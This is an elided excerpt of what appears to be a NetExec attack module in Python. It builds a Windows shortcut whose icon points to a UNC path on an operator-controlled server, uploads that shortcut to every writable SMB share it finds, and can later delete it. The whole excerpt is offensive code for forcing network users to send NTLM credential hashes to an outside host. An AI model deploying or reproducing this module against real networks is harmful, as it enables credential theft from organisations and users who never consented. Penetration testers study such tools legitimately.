...
class NXCModule:
    ...
    def options(self, context, module_options):
        ...
        if not self.cleanup:
            ...
            link.icon = (
                self.ico_uri if self.ico_uri else f"\\\\{self.server}\\icons\\icon.ico"
            )
            link.save()
    ...
    def on_login(self, context, connection):
        ...
        if shares:
            ...
            for share in shares:
                if (
                    "WRITE" in share["access"]
                    and share["name"] not in self.ignore_shares
                ):
                    if self.shares is not None and share["name"] not in self.shares:
                        context.log.debug(
                            f"Did not write to {share['name']} share as it was not specified in the SHARES option"
                        )
                        continue
                    ...
                    if not self.cleanup:
                        with open(self.local_lnk_path, "rb") as lnk:
                            try:
                                connection.conn.putFile(
                                    share["name"], self.remote_file_path, lnk.read
                                )
                                context.log.success(
                        ...
                        try:
                            connection.conn.deleteFile(
                                share["name"], self.remote_file_path
                            )
                            context.log.success(
